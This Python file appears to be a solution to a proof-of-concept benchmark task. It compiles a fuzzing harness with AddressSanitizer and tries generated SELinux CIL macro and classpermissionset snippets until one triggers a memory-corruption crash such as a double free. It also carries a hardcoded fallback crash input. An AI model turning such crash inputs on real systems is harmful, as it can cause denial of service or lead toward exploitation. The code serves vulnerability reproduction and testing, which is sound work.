import os
import tarfile
import tempfile
import subprocess
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        try:
            poc = self._try_dynamic(src_path)
        except Exception:
            poc = None
        if poc is not None:
            return poc
        # Fallback: static candidate (may or may not trigger, but required to return something)
        return self._static_fallback()

    # ---------------- Dynamic path ----------------

    def _try_dynamic(self, src_path: str):
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            # Extract tarball
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            return None

        root = self._find_project_root(tmpdir)
        if root is None:
            return None

        fuzzer_file = self._find_fuzzer_file(root)
        if fuzzer_file is None:
            return None

        exe_path = os.path.join(root, "poc_fuzz_driver")
        use_asan = self._build_harness(root, fuzzer_file, exe_path)
        if use_asan is None:
            return None

        candidates = self._generate_candidates()
        if not candidates:
            return None

        env = os.environ.copy()
        if use_asan:
            # Disable leak detection for speed / stability
            env.setdefault("ASAN_OPTIONS", "detect_leaks=0")

        for idx, text in enumerate(candidates):
            poc_path = os.path.join(root, f"poc_{idx}.cil")
            try:
                with open(poc_path, "wb") as f:
                    f.write(text.encode("ascii", errors="ignore"))
            except Exception:
                continue

            try:
                res = subprocess.run(
                    [exe_path, poc_path],
                    cwd=root,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                    timeout=10,
                )
            except Exception:
                continue

            out = res.stdout + res.stderr
            crashed = False
            if use_asan:
                if b"ERROR: AddressSanitizer" in out:
                    crashed = True
            else:
                if (
                    b"double free or corruption" in out
                    or b"free(): invalid pointer" in out
                    or b"corrupted double-linked list" in out
                    or res.returncode < 0
                    or res.returncode > 128
                ):
                    crashed = True

            if crashed:
                return text.encode("ascii", errors="ignore")

        return None

    def _find_project_root(self, base: str) -> str | None:
        try:
            entries = [
                os.path.join(base, e)
                for e in os.listdir(base)
                if not e.startswith(".")
            ]
        except Exception:
            return None
        if len(entries) == 1 and os.path.isdir(entries[0]):
            return entries[0]
        return base

    def _find_fuzzer_file(self, root: str) -> str | None:
        for dirpath, _, files in os.walk(root):
            for fname in files:
                if not fname.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fname)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" in txt:
                    return path
        return None

    def _gather_source_files(self, root: str, fuzzer_file: str, driver_file: str):
        sources = []
        fuzzer_abs = os.path.abspath(fuzzer_file)
        driver_abs = os.path.abspath(driver_file)
        for dirpath, dirnames, files in os.walk(root):
            parts = set(part.lower() for part in dirpath.split(os.sep) if part)
            if {
                "test",
                "tests",
                "example",
                "examples",
                "doc",
                "docs",
                "cmake-build-debug",
                "out",
                "build",
                ".git",
            } & parts:
                continue
            for fname in files:
                if not fname.endswith(".c"):
                    continue
                path = os.path.join(dirpath, fname)
                ap = os.path.abspath(path)
                if ap == fuzzer_abs or ap == driver_abs:
                    continue
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" in txt:
                    continue
                if " main(" in txt or "main(" in txt:
                    # Skip other mains
                    continue
                sources.append(path)
        return sources

    def _gather_include_dirs(self, root: str):
        incs = set()
        for dirpath, _, files in os.walk(root):
            parts = set(part.lower() for part in dirpath.split(os.sep) if part)
            if {"test", "tests", "example", "examples", "doc", "docs"} & parts:
                continue
            for fname in files:
                if fname.endswith(".h"):
                    incs.add(dirpath)
        return sorted(incs)

    def _build_harness(self, root: str, fuzzer_file: str, exe_path: str):
        driver_code = r"""
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);

int main(int argc, char **argv) {
    if (argc < 2) {
        return 1;
    }
    const char *path = argv[1];
    FILE *f = fopen(path, "rb");
    if (!f) {
        return 1;
    }
    if (fseek(f, 0, SEEK_END) != 0) {
        fclose(f);
        return 1;
    }
    long sz = ftell(f);
    if (sz < 0) {
        fclose(f);
        return 1;
    }
    if (fseek(f, 0, SEEK_SET) != 0) {
        fclose(f);
        return 1;
    }
    size_t size = (size_t)sz;
    uint8_t *buf = (uint8_t *)malloc(size ? size : 1);
    if (!buf) {
        fclose(f);
        return 1;
    }
    size_t n = fread(buf, 1, size, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, n);
    free(buf);
    return 0;
}
"""
        driver_file = os.path.join(root, "poc_driver.c")
        try:
            with open(driver_file, "w") as f:
                f.write(driver_code)
        except Exception:
            return None

        sources = self._gather_source_files(root, fuzzer_file, driver_file)
        include_dirs = self._gather_include_dirs(root)

        compiler = shutil.which("clang")
        if compiler is None:
            compiler = shutil.which("gcc")
        if compiler is None:
            return None

        for use_asan in (True, False):
            cmd = [
                compiler,
                "-g",
                "-O1",
                "-std=c11",
                "-Wall",
                "-Wno-unused-function",
                "-Wno-unused-parameter",
            ]
            if use_asan:
                cmd += ["-fsanitize=address", "-fno-omit-frame-pointer"]
            for inc in include_dirs:
                cmd.append("-I" + inc)
            cmd += sources
            cmd.append(fuzzer_file)
            cmd.append(driver_file)
            cmd += ["-o", exe_path]

            try:
                res = subprocess.run(
                    cmd,
                    cwd=root,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            except Exception:
                continue

            if res.returncode == 0:
                return use_asan

        return None

    # ---------------- Candidate generation ----------------

    def _generate_candidates(self):
        # We generate many plausible CIL snippets involving:
        # - a class
        # - classpermission
        # - classpermissionset
        # - macro with classpermission parameter
        # - macro invocation with anonymous or named classpermission
        class_decl = "(class testc (p1 p2))"
        cp_exprs = ["(testc (p1))", "((testc (p1)))"]

        bodies = [
            "cp",
            "(cp)",
            "((cp))",
            cp_exprs[0],
            "(" + cp_exprs[0] + ")",
            "(" + cp_exprs[0] + " cp)",
            "(cp " + cp_exprs[0] + ")",
            cp_exprs[1],
            "(" + cp_exprs[1] + ")",
            "(cp " + cp_exprs[1] + ")",
        ]

        candidates = []

        for use_named in (False, True):
            for cp_expr_named in cp_exprs:
                for arg_form in ("cp1", cp_exprs[0], cp_exprs[1]):
                    if arg_form == "cp1" and not use_named:
                        continue
                    for body in bodies:
                        cp_def = ""
                        if use_named:
                            cp_def = f"(classpermission cp1 {cp_expr_named})"
                        cps_def = f"(classpermissionset cps {body})"
                        macro_def = (
                            "(macro m ((classpermission cp))\n"
                            f"  {cps_def}\n"
                            ")"
                        )
                        program_parts = [class_decl]
                        if cp_def:
                            program_parts.append(cp_def)
                        program_parts.append(macro_def)
                        program_parts.append(f"(m {arg_form})")
                        program = "\n".join(program_parts) + "\n"
                        candidates.append(program)

        # Deduplicate
        unique = []
        seen = set()
        for c in candidates:
            if c not in seen:
                seen.add(c)
                unique.append(c)
        return unique

    # ---------------- Static fallback ----------------

    def _static_fallback(self) -> bytes:
        # Use the first generated candidate as a static fallback
        candidates = self._generate_candidates()
        if not candidates:
            # Extremely unlikely: provide a minimal hardcoded snippet
            fallback = (
                "(class testc (p1 p2))\n"
                "(macro m ((classpermission cp))\n"
                "  (classpermissionset cps (cp))\n"
                ")\n"
                "(m (testc (p1)))\n"
            )
            return fallback.encode("ascii", errors="ignore")
        return candidates[0].encode("ascii", errors="ignore")
